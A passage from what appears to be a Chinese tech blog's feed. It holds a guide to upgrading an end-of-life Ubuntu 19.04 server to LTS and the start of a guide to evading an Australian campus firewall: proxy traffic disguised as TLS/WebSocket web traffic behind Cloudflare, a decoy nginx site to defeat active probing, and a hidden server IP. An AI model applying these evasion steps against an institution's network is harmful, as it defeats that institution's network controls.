class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">DNS</span> = <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br></code></pre></td></tr></table></figure><p>这会覆盖原有 DNS 配置，但 DNS 服务器未必是可达的（ <del>原因懂的都懂</del> ），最简单的解决方案是删除 DNS 配置或是更改成其他的可用的 DNS 服务器（例如 <code>114.114.114.114</code> ）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;龙哥就是龙！惹啊！&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="WireGuard" scheme="https://arttnba3.github.io/tags/WireGuard/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x03】将 EOL 的 Ubuntu 升级为 LTS 版本</title>
    <link href="https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/"/>
    <id>https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/</id>
    <published>2024-09-23T09:09:09.000Z</published>
    <updated>2024-10-10T07:04:08.727Z</updated>
    
    <content type="html"><![CDATA[<p>欸你怎么死了（指 EOL Release）</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近笔者手上又多了台服务器的使用权，按照惯例每次登入一台新的服务器首先要做的第一件事自然是得先跑跑 <code>neofetch</code> 看看实力，但是发现没法安装软件包：</p><p><img src="https://s2.loli.net/2024/10/10/i8YqyG3QZ6V5tUk.png"></p><p>也没法打 <code>update &amp; upgrade</code> 的组合拳，因为这是非 LTS 的寿命只有短短 9 个月的 <code>Ubuntu 19.04 Disco</code> 版本：</p><p><img src="https://s2.loli.net/2024/10/10/dUApLxgq8XSzHrM.png"></p><p>虽然笔者不太理解为什么会有运维在服务器上安装这种短命版本，但是 <strong>新软件包都没法安的服务器自然是没法用的</strong> （ <del>难道真有人在服务器上就用一个自带的 gcc 用到死？</del> ），因此当务之急是先升级到下一个可用版本（通常是最近的一个 LTS 版本），但是当笔者运行 <code>sudo do-release-upgrade</code> 的时候服务器对笔者说 <strong>别急</strong> ：</p><p><img src="https://s2.loli.net/2024/10/10/nWCzB74GvqxFi1Y.png"></p><p>因此这篇博客简单记录一下怎么恢复短命 Ubuntu 版本的可用性并正常升级到下一个长命版本（指 <code>long-term support</code> ）</p><blockquote><p>这就是为什么大家都应该在服务器上使用企业级的 Linux 发行版 openSUSE Leap （或是 Slowroll），而不是莫名其妙安一个短命的 Ubuntu 版本：）</p></blockquote><h1 id="0x01-从-Ubuntu-19-04-升级到-LTS-版本"><a href="#0x01-从-Ubuntu-19-04-升级到-LTS-版本" class="headerlink" title="0x01. 从 Ubuntu 19.04 升级到 LTS 版本"></a>0x01. 从 Ubuntu 19.04 升级到 LTS 版本</h1><blockquote><p>注：理论上应当不仅适用于 19.04，而应当也适用于其他短命版本</p><p>注2：如果你的网络连接似乎没有那么稳定，请在 <em>分离式终端</em> （例如 tmux ）中进行这一系列操作，以避免升级到一半断连了任务中断了导致系统环境直接炸了</p></blockquote><h2 id="恢复-19-04-Disco-可用性"><a href="#恢复-19-04-Disco-可用性" class="headerlink" title="恢复 19.04 Disco 可用性"></a>恢复 19.04 Disco 可用性</h2><p>首先备份一下原来的源，虽然说这个源已经没什么用了但是还是希望能在万一失败的情况下 <em>恢复案发原现场</em> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></code></pre></td></tr></table></figure><p>然后把软件源里的老源换成 <code>old-releases.ubuntu.com</code> :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/cn.archive.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/security.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>现在可以开始进行传统系统更新了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br></code></pre></td></tr></table></figure><blockquote><p>之后就可以正常安装软件了，这里笔者先安了一个 sshd，因为非常奇异搞笑的是笔者拿到的服务器上边居然没有安装 sshd，而是使用 ToDesk 进行远程连接（ <del>不知道原运维人员怎么想的，安这种生命周期只有 9 个月的版本也就算了服务器上连基础设施建设都没有</del> ），万幸的是笔者还有内网中另一台机器的控制权，因此有 sshd 的话就算万一 ToDesk 没法正常自启动笔者也能正常连接进去（<strong>事实证明 ToDesk 在重启之后确实没法直接重新连接</strong> ，虽然在 systemctl 里看这个服务似乎仍是正常运行的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y openssh-server</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sshd.service</span><br></code></pre></td></tr></table></figure></blockquote><p>处理软件包间依赖，然后重启系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><h2 id="从-19-04-Disco-升级至-19-10-Eoan"><a href="#从-19-04-Disco-升级至-19-10-Eoan" class="headerlink" title="从 19.04 Disco 升级至 19.10 Eoan"></a>从 19.04 Disco 升级至 19.10 Eoan</h2><p>笔者本以为可以直接 <code>do-release-upgrade</code>  从 19.04 升级到 20.04 LTS 然后再继续升级：</p><p><img src="https://s2.loli.net/2024/10/10/LXoTc2enaBRtOir.png"></p><p>没有想到的是这个升级工具并不支持：</p><p><img src="https://s2.loli.net/2024/10/10/At5dqCYpEiUxsSa.png" alt="image.png"></p><p>因此我们需要先升级到下一个 <del>短命</del> 版本 <code>19.10</code> ，首先 <strong>手动</strong> 将软件源从 <code>19.04</code> 换为 <code>19.10</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/disco/eoan/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>然后更新系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><blockquote><p>可能会有人认为万幸的是我们还有 <strong>手动进行自动升级</strong> 这一条路可以走，即首先前往 <a href="https://changelogs.ubuntu.com/meta-release">https://changelogs.ubuntu.com/meta-release</a> 找到 <code>19.04</code> 的下一个版本 <code>19.10</code> ：</p><p><img src="https://s2.loli.net/2024/10/10/X7YNw1zSgbLxPQC.png"></p><p>下载 19.10 的升级工具，解压，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget http://old-releases.ubuntu.com/ubuntu/dists/eoan-updates/main/dist-upgrader-all/current/eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> eoan.tar.gz eoan/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./eoan</span><br></code></pre></td></tr></table></figure><p>然后就 segmentation fault 了，因此这个方法至少在笔者手上的服务器上似乎是不太可行的：</p><p><img src="https://s2.loli.net/2024/10/10/XHrs49tWSpbcImP.png"></p></blockquote><h2 id="从-19-10-升级至-20-04-LTS"><a href="#从-19-10-升级至-20-04-LTS" class="headerlink" title="从 19.10 升级至 20.04 LTS"></a>从 19.10 升级至 20.04 LTS</h2><p>万事俱备，现在让我们迈向下一个发行版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo do-release-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><p>成功升级至 20.04 LTS 版本：</p><p><img src="https://s2.loli.net/2024/10/10/mP4GTkSr5y2zsKO.png"></p><blockquote><p>为什么截图上是用密码登录是因为笔者拿到服务器后第一时间想的先是升级，因此还没有配置密钥登录， <del>同时也可以看出原运维并没有把 sshd 的密码登录给关闭</del></p></blockquote><h2 id="从-20-04-升级到-24-04"><a href="#从-20-04-升级到-24-04" class="headerlink" title="从 20.04 升级到 24.04"></a>从 20.04 升级到 24.04</h2><p>如果想要继续升级到更新的系统版本，继续一路运行 <code>sudo do-release-upgrade</code> 即可：</p><p><img src="https://s2.loli.net/2024/10/10/WEax5DQP1LJt67R.png"></p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p>感谢 <code>Ask Ubuntu</code> 社区提供的核心解决方案：</p><p><a href="https://askubuntu.com/questions/1260939/cannot-upgrade-from-disco-19-04-to-focal-20-04-after-end-of-life-using-do-releas">Ask Ubuntu - Cannot upgrade from disco 19.04 to focal 20.04 after end of life using do-release-upgrade method</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;欸你怎么死了（指 EOL Release）&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x02】如何在澳洲校园网内玩原神</title>
    <link href="https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/"/>
    <id>https://arttnba3.github.io/2024/08/31/OPS-0X02-AUSTRALIA_FIREWALL_ESCAPE/</id>
    <published>2024-08-30T15:46:31.000Z</published>
    <updated>2024-11-11T10:50:18.866Z</updated>
    
    <content type="html"><![CDATA[<p>这个原神啊，能忍住一秒不玩的都是神人了</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>注：本文 <strong>仅</strong> 涉及<strong>澳洲大学校园</strong>的网络相关状况！ ！！<strong>不涉及也不适用任何澳洲境外的任何相关或无关场景！！！</strong></p></blockquote><p>众所周知笔者现在在南半球🇦🇺的某所不知名大学读 PhD <del>摆烂</del> 当中，虽然说日常畅游 GitHub 一类的网站没有啥问题，但是非常奇怪的是校园网当中居然也存在网站封锁，例如 <a href="https://www.taobao.com/">淘宝</a> 这样的中国购物网站就是上不去的：</p><p><img src="https://s2.loli.net/2024/09/11/TGRC8irBDyFcmaZ.png"></p><blockquote><p>包括原神也上不去，👴很愤怒💢</p></blockquote><p>虽然说 <em>在学校就该正经搞科研</em> ，但是笔者还是不太能忍受得了学校内各种网络封锁的存在，尤其是在笔者 <em>去年刚来那会在校园网内连 QQ 都登不上，只能用飞书聊天</em> ：</p><p><img src="https://s2.loli.net/2024/09/11/Nj3H5k7J4sbzQ6l.png"></p><p>总而言之相当数量的网站 <del>尤其是原神</del> 都上不去，对笔者的生活造成了不小的影响：</p><p><img src="https://s2.loli.net/2024/09/11/W37A2zSiabJNnC1.png"></p><p>因此笔者决定通过一些成熟的网络策略，在公有云上购买服务器做代理并架设一定的网络基础架构，以在学校内也能够重新登入一些笔者还在中国大陆的时候常用的一些网站 ： ） <del>比如玩原神</del></p><blockquote><p>注：笔者现在开始逐渐感觉自己的中文表达能力似乎在慢慢地有所下降了，不知道为啥：(</p></blockquote><h1 id="0x01-方案设计与准备工作"><a href="#0x01-方案设计与准备工作" class="headerlink" title="0x01. 方案设计与准备工作"></a>0x01. 方案设计与准备工作</h1><p>这一节简单讲一讲基本原理，以及笔者最终的方案设计： ）</p><blockquote><p>这一部分可能讲得不是很正确，因为笔者也不太懂，<del>有点愧对网安实验班出身…</del></p></blockquote><h2 id="Pre-网络代理"><a href="#Pre-网络代理" class="headerlink" title="Pre. 网络代理"></a>Pre. 网络代理</h2><p><strong>代理</strong> （Proxy）是一种特殊的服务，简单来说就是在进行互联网通信时客户端不直接向目标主机发送网络请求，而是先把请求发送给代理服务器，由代理服务器发送给目标主机，并接受响应数据再转发给客户端，这也叫 <strong>正向代理</strong> （Forward Proxy）</p><p><img src="https://s2.loli.net/2024/09/11/5HqDEysJgb7eLdn.png"></p><p>相应地，有正向就有反向， <strong>反向代理</strong> （Reverse Proxy）主要是在服务端侧，其负责将客户端发来的请求转发给真正的服务端</p><p><img src="https://s2.loli.net/2024/09/11/57pIuhJ6PHQaY1w.png"></p><blockquote><p>例如 <a href="https://nginx.org/en/">NGINX</a> 便是一个非常有名的有着反向代理功能的 Web 服务器软件</p><p><img src="https://s2.loli.net/2024/09/11/q5o1EeXMIdwxGNH.png"></p></blockquote><p>我们不难想到的是，有了代理服务器的存在，我们便可以将网络请求发送给代理服务器，让代理服务器替代我们进行实际的网络请求，由于我们的代理服务器并不在防火墙限制的网站&#x2F;IP列表当中，由此我们便能借助代理服务器访问被防火墙所禁止访问的网络服务， <del>例如让👴在校园网玩原神</del></p><p><img src="https://s2.loli.net/2024/09/11/7PhaTAnFjBvLJGM.png" alt="例如欧美国家有的学校会把 Facebook 给墙了，利用代理就能上 Facebook"></p><h2 id="Pre-信道加密与包检测对抗"><a href="#Pre-信道加密与包检测对抗" class="headerlink" title="Pre. 信道加密与包检测对抗"></a>Pre. 信道加密与包检测对抗</h2><p>但是有了代理服务器并不代表我们就能直接在澳洲校园网里畅玩原神了，部分防火墙会对传输的数据包进行检测，例如传统的 HTTP 和 SOCKS5 代理都是非加密的，无论是目的地还是内容都很容易便能被检测出来：</p><p><img src="https://s2.loli.net/2024/09/11/YkH1SPdZygBhrM5.png"></p><p>如何对抗各种包检测技术？最简单的方法自然是给数据包进行加密与混淆，从而使得防火墙无法检测出这些流量的真正目的，例如使用 Shadowsocks、Trojan 等加密协议来隐藏代理流量的特征，或是与代理服务器之间组建 VPN，通过 VPN 间建立的加密信道来保护流量隐私：</p><p><img src="https://s2.loli.net/2024/09/11/Ph1xRkJBMf65UEs.png"></p><p>但正所谓道高一尺魔高一丈，这些加密协议终究 <strong>存在一些特殊的内容或是行为特征</strong> ，例如 VMess 协议可以通过重放攻击的方式进行判定，此外 <strong>深度包检测技术</strong> （Deep Packet Inspection）会在传统的对数据包请求头进行检测的基础之上再对数据包的内容进行检测，如果发现了相应的指纹特征，便会进行阻断：</p><p><img src="https://s2.loli.net/2024/09/11/khVOWTJKSPdzbNo.png"></p><blockquote><p>许多网络设备、硬件防火墙厂商都有支持 DPI 的产品，例如 Advantech 家的 <a href="https://www.advantech.com/en-us/resources/case-study/33a34926-ded6-4cb1-a357-21de674c2200">FWA-6520</a></p><p><img src="https://s2.loli.net/2024/09/11/X7TPaKLUbilQFh9.png"></p></blockquote><p>但是深度包检测等技术终究不是万能的，针对 Shadowsocks 这种非主流协议进行阻断不会对正常通信造成太大影响，但是若是防火墙连最常见的加密流量类型都拦截则会直接影响正常的网络通信，例如 TLS （Transport Layer Security）协议是一种广泛采用的安全性协议，HTTPS 便是 <code>HTTP over TLS</code> ，Websocket 则允许我们在 HTTP 协议上建立全双工的通信，我们不难想到的是使用 HTTPS 进行通信，或是通过 Websocket over TLS 我们便能将代理流量伪装成普通的 Web 应用的流量，内部再使用 <a href="https://xtls.github.io/en/config/outbounds/vless.html">VLESS</a> 、<a href="https://github.com/trojan-gfw/trojan">Trojan</a> 等协议进行代理，从而轻松欺骗过学校的防火墙</p><blockquote><p>以前还有使用 TLS over TLS 的，不过这样据说流量就又呈现出可被检测的特征了：(</p><p>但是两层 TLS 其实并非不常见，例如当我们使用基于 TLS 的代理浏览 HTTPS 网站时，外层是 TLS 代理，内层是网站的 TLS，由此便又有了两层整合成一层的 <a href="https://xtls.github.io/">XTLS</a> </p></blockquote><h2 id="Pre-VPS-购买"><a href="#Pre-VPS-购买" class="headerlink" title="Pre. VPS 购买"></a>Pre. VPS 购买</h2><p>笔者在 Vultr 上买了一台 Singapore 的 VPS，6 USD 每月，选择 Singapore 主要的原因是离国内比较近访问国内网站会比较方便，选 Vultr 的主要原因则是因为可以随时暂停计费，方案比较灵活的同时价格也还算实惠</p><blockquote><p>像 banwagong 这样的老牌 VPS 并不适合笔者，总不能流量包先从澳洲跑一趟美国再跑回国内再原路返回澳洲吧，那样延迟就上天了，对笔者而言最优选择还是数据包线路能尽量和国内形成一条直线： ）</p></blockquote><p><img src="https://s2.loli.net/2024/09/11/s1GDHYUCQ7IVWEB.png"></p><blockquote><p>当然，如果你只是纯粹的 VPS 爱好者，单纯想随便买点 VPS 来玩玩，笔者也有一些非常非常便宜的 VPS 可以推荐，例如 Cloudcone 的 <a href="https://app.cloudcone.com.cn/vps/263/create?token=cc-turns-7-cs-2">10刀一年的小 VPS</a>  或是 <a href="https://app.cloudcone.com.cn/vps/262/create?token=cc-turns-7-cs-1">12刀一年的小 VPS</a> ，或者是 RackNerd 的 <a href="https://www.rnvps.com/go-358">11 刀一年的小 VPS</a> ，<del>当然这种便宜货就不要想有太好的质量了</del>：</p><p><img src="https://s2.loli.net/2024/09/30/ijyQ2LxfCn4STkv.png" alt="反正笔者是买了一台以备不时之需"></p></blockquote><h2 id="Pre-域名购买"><a href="#Pre-域名购买" class="headerlink" title="Pre. 域名购买"></a>Pre. 域名购买</h2><p>因为我们后面要用 Cloudflare 做 CDN，所以直接上 Cloudflare 买一个就好了，反正不同的域名提供商之间价格差别也不算太大，在其他域名提供商买了再转到 Cloudflare 还会比较麻烦</p><p>例如买个 <code>114514beastsenbei.uk</code> ，一年只要 <code>4.94USD</code> ，少喝几杯饮料就省出来了： ）</p><p><img src="https://s2.loli.net/2024/09/18/ztD75NwACxynpQf.png"></p><blockquote><p>注：这个域名现在还没人注册，心动的先辈建议赶紧雷…雷厉风行地购买（大嘘</p></blockquote><h1 id="0x02-正式搭建代理服务器"><a href="#0x02-正式搭建代理服务器" class="headerlink" title="0x02. 正式搭建代理服务器"></a>0x02. 正式搭建代理服务器</h1><h2 id="配置域名解析和-Cloudflare-代理"><a href="#配置域名解析和-Cloudflare-代理" class="headerlink" title="配置域名解析和 Cloudflare 代理"></a>配置域名解析和 Cloudflare 代理</h2><p>主要是为了防止 IP 直连被封 IP 后面会很麻烦，以及避免服务器真实 IP 被探查到：</p><p><img src="https://s2.loli.net/2024/09/12/XfYnZj1a3icGKu2.png"></p><h2 id="配置-SSH-Tunnel"><a href="#配置-SSH-Tunnel" class="headerlink" title="配置 SSH Tunnel"></a>配置 SSH Tunnel</h2><p>用 ssh 直接连接 IP 比较危险，万一 IP 或者端口被学校封锁了直接连不上服务器就尴尬了，因此我们推荐使用 Cloudflare 创建 SSH Tunnel</p><blockquote><p>Cloudflare，👴滴超人！</p></blockquote><p>简而言之创建步骤首先是 <code>Zero Trust -&gt; Networks -&gt; Tunnels -&gt; Add a tunnel -&gt; Select Cloudflared -&gt; 命名 -&gt; 安装 Cloudflared -&gt; 配置 Route Traffic</code> </p><p>对于 openSUSE 而言，Tumbleweed 可以直接安装，Leap 则需要借助 OPI 安装 experimental package：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> opi</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo opi cloudflared</span><br></code></pre></td></tr></table></figure><blockquote><p>实际上， Cloudflare 官网给出的安装 Cloudflared 的方式是非常原始的直接下载软件包并安装，而且只提供了 Deb 和 Rpm，为什么不直接传到各大发行版仓库呢：(</p></blockquote><p>完成 Cloudflare 安装后使用官网给的参数启动：</p><p><img src="https://s2.loli.net/2024/09/12/ZDevGiAkytf6BU9.png"></p><p>成功连接上后配置一下 Tunnel 类型等信息即可，注意这个域名不能与现有域名记录冲突：</p><blockquote><p><code>URL</code> 可以直接写 <code>127.0.0.1:22</code></p></blockquote><p><img src="https://s2.loli.net/2024/09/12/ANOrRq7LtK4ZUvH.png"></p><p>最后在本地也安装一个 <code>cloudflared</code> （本地不用创建 tunnel），并在 <code>.ssh/config</code> 中添加如下配置：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Host 你的自定义域名<br>        HostName 你的自定义域名<br>        TCPKeepAlive yes<br>        <span class="hljs-keyword">User</span> <span class="hljs-title">arttnba3</span><br>        ServerAliveInterval <span class="hljs-number">15</span><br>        IdentityFile 你的私钥位置，例如~/.ssh/id_ed25519<br>        Port <span class="hljs-number">22</span><br>        ProxyCommand cloudflared access ssh --hostname %h<br></code></pre></td></tr></table></figure><p>之后便能通过域名连接了：</p><p><img src="https://s2.loli.net/2024/09/12/68RhKDnl2FWjoI3.png"></p><h2 id="TLS-证书配置"><a href="#TLS-证书配置" class="headerlink" title="TLS 证书配置"></a>TLS 证书配置</h2><h3 id="方法一：Let’s-Encrypt-ACMS-自动更新-TLS-证书（🕊）"><a href="#方法一：Let’s-Encrypt-ACMS-自动更新-TLS-证书（🕊）" class="headerlink" title="方法一：Let’s Encrypt + ACMS 自动更新 TLS 证书（🕊）"></a>方法一：Let’s Encrypt + ACMS 自动更新 TLS 证书（🕊）</h3><blockquote><p>你可以选择似乎是更加方便的 <a href="https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E">ACME</a> ，<del>反正笔者懒得研究这个东西该怎么用</del></p></blockquote><h3 id="方法二：直接使用-Cloudflare-的免费-TLS-证书"><a href="#方法二：直接使用-Cloudflare-的免费-TLS-证书" class="headerlink" title="方法二：直接使用 Cloudflare 的免费 TLS 证书"></a>方法二：直接使用 Cloudflare 的免费 TLS 证书</h3><p>Cloudflare 提供了免费的 TLS 证书，直接创建即可：</p><p><img src="https://s2.loli.net/2024/09/11/8bKsuFVLBHNIde1.png" alt="有效期有tm的15年，这还要啥自行车！"></p><p>之后会保存下来一份 PEM 和一份 KEY 文件，我们将在后续配置 NGINX 时使用到这个东西</p><p>以及别忘了把 Cloudflare 中的 TLS 加密改为严格，否则很容易莫名其妙就 404 了：</p><p><img src="https://s2.loli.net/2024/09/12/vmE4h23kVWMw6Hr.png"></p><h2 id="NGINX-搭建"><a href="#NGINX-搭建" class="headerlink" title="NGINX 搭建"></a>NGINX 搭建</h2><blockquote><p> 这个网上教程就非常多了，笔者这里仅简略讲讲，你也可以不用参照笔者所写的这一节：）</p></blockquote><p>首先配置防火墙，开启正常网站所需的 80 和 443 端口，这里以 <code>firewalld</code> 为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --zone=public --add-port=443/tcp --permanent</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo firewall-cmd --reload</span><br></code></pre></td></tr></table></figure><p>如果你的服务器使用的是 <code>ufw</code> ，则参照如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 80/tcp</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ufw allow 443/tcp</span><br></code></pre></td></tr></table></figure><p>然后安装 NGINX：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo zypper <span class="hljs-keyword">in</span> nginx</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now nginx.service</span><br></code></pre></td></tr></table></figure><p>然后简单配置一个静态网页界面作为伪装，以防万一校方进行主动探测发现情况不对，首先创建配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">touch</span> /etc/nginx/vhosts.d/你的域名.conf</span><br></code></pre></td></tr></table></figure><p>在文件中写入如下内容，第一个 server 是正常的 https 网站配置，第二个 server 是监听 80 端口将 http 跳转到 https，剩下两个是把未通过指定域名的访问全都返回 403 Forbidden：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-section">location</span> / &#123;<br>                <span class="hljs-attribute">root</span> 你的静态网页目录;<br>                <span class="hljs-attribute">index</span> 你的网站首页文件（例如 index.html）;<br>        &#125;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">server_name</span> 你的域名;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://你的域名<span class="hljs-variable">$request_uri</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span>;<br>        <span class="hljs-attribute">server_name</span> 你的IP;<br>        <span class="hljs-attribute">ssl_certificate</span>     你的 .pem 证书路径;<br>        <span class="hljs-attribute">ssl_certificate_key</span> 你的 .key 密钥路径;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>&#125;<br><br><span class="hljs-section">server</span> &#123;<br>        <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>        <span class="hljs-attribute">listen</span> 